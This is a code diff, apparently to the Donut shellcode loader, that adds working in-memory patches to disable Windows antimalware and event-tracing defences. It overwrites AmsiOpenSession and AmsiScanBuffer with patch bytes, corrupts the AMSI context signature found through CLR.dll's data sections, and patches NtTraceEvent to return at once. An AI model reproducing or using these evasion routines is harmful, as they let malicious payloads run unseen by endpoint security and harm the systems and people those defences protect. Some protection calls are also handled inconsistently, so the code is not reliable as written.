@@ -30,45 +30,153 @@
 */
 
 #include "bypass.h"
-
-#if defined(BYPASS_AMSI_A)
-DWORD64 GetAddr(LPVOID addr) {
-
-	for (int i = 0; i < 1024; i++) {
-		
-		if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
-	}
-
-}
-// This is where you may define your own AMSI bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
+#define BYPASS_AMSI_A
+#if defined(BYPASS_AMSI_NONE)
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+  return TRUE;
+}
+
+#elif defined(BYPASS_AMSI_A)
+BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+  BOOL ret = //DisableAMSI_A(inst) &&
+  //DisableAMSI_B(inst) &&
+  DisableAMSI_C(inst);
+  return ret;
+}
+
+BOOL DisableAMSI_A(PDONUT_INSTANCE inst) {
   HMODULE dll;
-  DWORD   len, op, t;
+  DWORD   t;
   LPVOID  ptr;
 
   dll = xGetLibAddress(inst, inst->amsi);
   if(dll == NULL) return TRUE;
+  DPRINT("Get dll AMSI");
   
   ptr = xGetProcAddress(inst, dll, inst->amsiOpenSess, 0);
   if(ptr == NULL) return FALSE;
+  DPRINT("Get AMSIOpenSess");
   
 	char Patch[100];
   Memset(&Patch, 0, 100);
-  Patch[0] = "\x75";
+  Patch[0] = 0x48;
+  Patch[1] = 0x31;
+  Patch[2] = 0xc9; // xor rcx rcx
 
 	DWORD OldProtect = 0;
-	SIZE_T memPage = 0x1000;
-	void* ptraddr = (void*)((DWORD64)ptr + 0x3);
-	void* ptraddr2 = (void*)GetAddr(ptr);
-
-	if(inst->api.VirtualProtect(&ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect)) return FALSE;
-  
-  Memcpy((void*)GetAddr(ptr), (PVOID)Patch, 1);
-
-	if(inst->api.VirtualProtect(&ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect)) return FALSE;
-		
+	DWORD memPage = 3;
+  DPRINT("VirtualProtect 1 0x%016x", ptr);
+	if(!inst->api.VirtualProtect(ptr, memPage, PAGE_EXECUTE_READWRITE, &OldProtect)) return FALSE;
+  DPRINT("memcpy");
+  Memcpy(ptr, Patch, 3);
+  DPRINT("VirtualProtect 2");
+	if(!inst->api.VirtualProtect(ptr, memPage, OldProtect, &t)) return FALSE;
+  DPRINT("Method A return");
 	return TRUE;
+}
+
+BOOL DisableAMSI_B(PDONUT_INSTANCE inst) {
+  HMODULE dll;
+  DWORD   t;
+  LPVOID  ptr;
+  DWORD OldProtect = 0;
+	DWORD memPage = 3;
+
+  char Patch[100];
+  Memset(&Patch, 0, 100);
+  Patch[0] = 0xb8;
+  Patch[1] = 0x34;
+  Patch[2] = 0x12;
+  Patch[3] = 0x07;
+  Patch[5] = 0x80;
+  Patch[6] = 0x66;
+  Patch[7] = 0xb8;
+  Patch[8] = 0x32;
+  Patch[9] = 0x00;
+  Patch[10] = 0xb0;
+  Patch[11] = 0x57;
+  Patch[12] = 0xc3;
+
+  DWORD offset = 0x83;
+
+  dll = xGetLibAddress(inst, inst->amsi);
+  if(dll == NULL) return TRUE;
+  DPRINT("Get dll AMSI");
+  
+  ptr = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
+  if(ptr == NULL) return FALSE;
+  DPRINT("Get AMSIScanBuffer");
+
+  if(!inst->api.VirtualProtect(ptr, memPage, PAGE_EXECUTE_READWRITE, &OldProtect)) return FALSE;
+  DPRINT("Memcpy 1");
+  Memcpy(ptr, Patch, 12);
+  DPRINT("Memcpy 2");
+  Memcpy((LPVOID)((char*)ptr + offset), "\x74", 1);
+	if(!inst->api.VirtualProtect(ptr, memPage, OldProtect, &t)) return FALSE;
+	DPRINT("Method B return");
+  return TRUE;
+}
+
+BOOL DisableAMSI_C(PDONUT_INSTANCE inst) {
+    LPVOID                   clr;
+    BOOL                     disabled = FALSE;
+    PIMAGE_DOS_HEADER        dos;
+    PIMAGE_NT_HEADERS        nt;
+    PIMAGE_SECTION_HEADER    sh;
+    DWORD                    i, j, res;
+    PBYTE                    ds;
+    MEMORY_BASIC_INFORMATION mbi;
+    _PHAMSICONTEXT           ctx;
+    
+    // get address of CLR.dll. if unable, this
+    // probably isn't a dotnet assembly being loaded
+    clr = inst->api.GetModuleHandleA(inst->clr);
+    if(clr == NULL) return FALSE;
+    
+    dos = (PIMAGE_DOS_HEADER)clr;  
+    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  
+    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
+      nt->FileHeader.SizeOfOptionalHeader);
+             
+    // scan all writeable segments while disabled == FALSE
+    for(i = 0; 
+        i < nt->FileHeader.NumberOfSections && !disabled; 
+        i++) 
+    {
+      // if this section is writeable, assume it's data
+      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+        // scan section for pointers to the heap
+        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);
+           
+        for(j = 0; 
+            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
+            j += sizeof(ULONG_PTR)) 
+        {
+          // get pointer
+          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
+          // query if the pointer
+          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
+          if(res != sizeof(mbi)) continue;
+          
+          // if it's a pointer to heap or stack
+          if ((mbi.State   == MEM_COMMIT    ) &&
+              (mbi.Type    == MEM_PRIVATE   ) && 
+              (mbi.Protect == PAGE_READWRITE))
+          {
+            ctx = (_PHAMSICONTEXT)ptr;
+            // check if it contains the signature 
+            if(ctx->Signature == *(PDWORD*)inst->amsi) {
+              // corrupt it
+              ctx->Signature = ctx->Signature +2;
+              disabled = TRUE;
+              break;
+            }
+          }
+        }
+      }
+    }
+    DPRINT("Method C return %i", disabled);
+    return disabled;
 }
 
 #elif defined(BYPASS_AMSI_B)
@@ -80,7 +188,7 @@ HRESULT WINAPI AmsiScanBufferStub(
     LPCWSTR      contentName,
     HAMSISESSION amsiSession,
     AMSI_RESULT  *result)
-{
+{    
     *result = AMSI_RESULT_CLEAN;
     return S_OK;
 }
@@ -390,7 +498,24 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
 // This is where you may define your own ETW bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
 BOOL DisableETW(PDONUT_INSTANCE inst) {
-    return TRUE;
+  HMODULE dll;
+  DWORD   t;
+  LPVOID  ptr;
+  DWORD OldProtect = 0;
+	DWORD memPage = 3;
+
+  dll = xGetLibAddress(inst, inst->ntdll);
+  if(dll == NULL) return TRUE;
+  DPRINT("Get dll Ntdll");
+  
+  ptr = xGetProcAddress(inst, dll, inst->ntTraceEvent, 0);
+  if(ptr == NULL) return FALSE;
+  DPRINT("Get NtTraceEvent");
+
+  if(inst->api.VirtualProtect(&ptr, memPage, PAGE_EXECUTE_READWRITE, &OldProtect)) return FALSE;
+  Memcpy(ptr, "\xc3", 1);
+	if(inst->api.VirtualProtect(&ptr, memPage, OldProtect, &t)) return FALSE;
+	return TRUE;
 }
 
 #elif defined(BYPASS_ETW_B)
